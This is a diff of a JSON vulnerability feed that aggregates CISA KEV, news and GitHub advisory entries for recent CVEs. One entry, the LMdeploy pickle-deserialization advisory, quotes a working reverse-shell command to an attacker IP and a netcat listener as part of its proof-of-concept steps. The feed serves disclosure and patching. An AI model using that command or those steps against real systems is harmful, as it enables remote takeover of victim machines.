@@ -1,10 +1,29 @@
 {
-  "generated": "2026-09-16T15:41:24.066712+00:00",
-  "total": 27,
-  "kev": 1,
+  "generated": "2026-09-16T20:33:36.823914+00:00",
+  "total": 28,
+  "kev": 3,
   "zero_day": 16,
   "enriched": 0,
   "findings": [
+    {
+      "id": "CVE-2026-87886",
+      "title": "CVE-2026-87886 \u2014 Acronis Backup Incorrect Default Permissions Vulnerability",
+      "summary": "Vendor: Acronis | Product: Backup. Acronis Backup plugin for cPanel & WHM and extension for Plesk contains an incorrect default permissions vulnerability that could allow for privilege escalation. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-19)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-87886",
+      "published": "2026-09-16",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-87886"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
     {
       "id": "CVE-2026-58704",
       "title": "CVE-2026-58704 \u2014 Google Pixel Improper Authorization Vulnerability",
@@ -19,6 +38,25 @@
       ],
       "cve_ids": [
         "CVE-2026-58704"
+      ],
+      "is_kev": true,
+      "is_zero_day": true,
+      "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-76460",
+      "title": "CVE-2026-76460 \u2014 Cisco Identity Services Engine Incorrect Use of Privileged APIs Vulnerability",
+      "summary": "Vendor: Cisco | Product: Identity Services Engine. Cisco Identity Services Engine (ISE) and Cisco ISE Passive Identity Connector (ISE-PIC) contain an incorrect use of privileged APIs vulnerability that could allow an unauthenticated, remote attacker to gain unauthorized access to the affected device by bypassing the web-based management interface. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. (due 2026-09-19)",
+      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-76460",
+      "published": "2026-09-16",
+      "source": "CISA KEV",
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited"
+      ],
+      "cve_ids": [
+        "CVE-2026-76460"
       ],
       "is_kev": true,
       "is_zero_day": true,
@@ -280,6 +318,23 @@
       "is_high_severity": false
     },
     {
+      "id": "https://thehackernews.com/2026/09/attackers-exploit-issabel-framework.html",
+      "title": "Attackers Exploit Issabel Framework Flaw Enabling Unauthenticated OS Command Execution",
+      "summary": "A critical security flaw in Issabel Framework, a web-based framework for the open-source unified communications PBX software, has come under active exploitation.\n\nThe vulnerability in question is CVE-2026-89026 (CVSS v3.1 score: 9.8/CVSS v4.0 score: 9.3), which can allow an unauthenticated remote attacker to execute arbitrary operating system (OS) commands by taking advantage of a hard-coded",
+      "link": "https://thehackernews.com/2026/09/attackers-exploit-issabel-framework.html",
+      "published": "2026-09-16T15:50:59+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [
+        "CVE-2026-89026"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
       "id": "CVE-2025-59953",
       "title": "LMdeploy has Remote Code Execution by Pickle Deserialization via zmq_rpc.call_and_response() in InterLM/lmdeploy",
       "summary": "### Description\n\nThe LMdeploy\u00a0implements an\u00a0rpc server (AsyncRPCServer in zmq_rpc.py)\u00a0for supporting the RPC communications. In its core functionality\u00a0call_and_response(), I found it will directly use the\u00a0pickles.loads()\u00a0to deserialize the received messages without any sanitization, hence resulting in a remote code execution vulnerability by this RPC server.\n\n### Proof of Concept\n\n* Step1:\nThe victim user starts a RPC server that connects to its network interface. We give our example code (server.py) in the attachment, you can reproduce directly with server.py.\n\n* Step2:\nThe attacker can then send malicious pickle dump data to the remote RPC address for the attack. We give a example to show how can an attacker acquire a command shell:\n<img width=\"832\" height=\"324\" alt=\"image\" src=\"https://github.com/user-attachments/assets/03b9654d-e25b-4e93-903a-2aae8b12e704\" />\n\nIn this example, attacker modifies AsyncRPCClient and send a request containing malicious pickle dump data to let the victim execute command \u201cbash -c \u2018bash -i >& /dev/tcp/202.112.47.27/4444 0>&1\u2019\u201d, where 202.112.47.27 is an attacker\u2019s server. \nTwo points require special attention:\n1.The client code originally only connects to localhost over a socket, but an attacker can easily change localhost to another IP to perform remote exploitation, because the RPC server does not validate the connecting IP.\n2.The RPC server\u2019s port is randomized, but an attacker can still scan ports to find and exploit it; in our demo we explicitly set the target port.\n\n\n* Step3:\nAttacker can use nc tool (nc -l 4444) to create a reverse shell and wait for connection. Then, attacker runs the client to send the malicious request. Since the pickle deserialization vulnerability, the victim rpc server will execute the malicious command and consequently let attacker get the command shell of victim machine.\n\nWe also give a demo video in the attachment, along with modified zmq_rpc.py. When you reproduce this issue in the client side (as an a",
@@ -401,42 +456,6 @@
       ],
       "cve_ids": [
         "CVE-2026-61554"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-69218",
-      "title": "Http4s Ember HTTP/2: unbounded continuation frame accumulation",
-      "summary": "When Ember receives an HTTP/2 `HEADERS` or `PUSH_PROMISE` frame without the `END_HEADERS` flag, it buffers the header block fragment and waits for subsequent `CONTINUATION` frames.  These accumulate unbounded until the connection closes. \n\n### Impact\n\nA remote, unauthenticated peer can exhaust the heap on any Ember endpoint that has HTTP/2 enabled:\n\n- **ember-server with `.withHttp2`**: any HTTP/2 client can trigger this against any reachable path (including paths that return 404).  No authentication is required because the attack completes before the request is decoded.\n- **ember-client with `.withHttp2`**:  a malicious or compromised origin server can trigger this via the response header block.  A single in-flight request is sufficient.\n\nMemory consumption is bounded only by the attacker's upload bandwidth and the connection lifetime.\n\n### Prerequisites\n\n- `EmberServerBuilder` configured with `.withHttp2`.\n    - For the server: the attacker can establish an HTTP/2 connection\n    - For the client: the application makes a request to an attacker-controlled origin.\nHTTP/2 incoming headers exceeding the configured size limit are buffer in order to generate an informative HTTP 413 response. If a client does not stop sending headers, this leads to memory exhaustion.\n\n### Patches\n\nThe fix bounds the accumulated header-block size at `SETTINGS_MAX_HEADER_LIST_SIZE` (derived from `EmberServerBuilder.maxHeaderSize` / `EmberClientBuilder.maxResponseHeaderSize`).  When a `CONTINUATION` frame would push the accumulated block over that limit, the connection is terminated with `GOAWAY`.  The `receiveHeadersTimeout` additionally bounds how long an incomplete header block may remain open.\n\n### Workarounds\n\n- Disable HTTP/2 (`.withHttp2`) until upgraded (default).  It is off by default.\n- If HTTP/2 must remain enabled, place ember behind a reverse proxy that terminates HTTP/2 and speaks HTTP/1.1 to ember.",
-      "link": "https://github.com/advisories/GHSA-cp4q-fqw9-4hf6",
-      "published": "2026-09-15T20:01:08Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-69218"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-69214",
-      "title": "Http4s: CookieJar middleware accepts arbitrary Set-Cookie domain",
-      "summary": "When processing a `Set-Cookie` from a response, the `CookieJar` client middleware trusts the server-supplied `Domain` attribute verbatim, with no check that it domain-matches the host that sent the cookie (RFC6265 \u00a75.3 step 6) and no public suffix check.  A malicious or compromised server can therefore plant a cookie for any domain in the cookie jar, which is subsequently set on the client's next request to that victim domain, enabling session fixation or overwriting security-relevant cookies.\n\n## Impact\n\nSession fixation and overwrite of security-relevant cookies for arbitrary domains contacted by the same wrapped client.\n\n## Preconditions\n\n- Application uses the `CookieJar` client middleware.\n- Application contacts an attacker-controlled (or compromised) server using the same jar it uses for trusted hosts.\n\n## Workarounds\n\n- Do not share a `CookieJar` across trusted and untrusted targets.\n\n## Note\n\nThis middleware still does not implement public suffix rejection.",
-      "link": "https://github.com/advisories/GHSA-wv64-j4fq-5f9x",
-      "published": "2026-09-15T20:00:43Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-69214"
       ],
       "is_zero_day": false,
       "is_high_severity": true
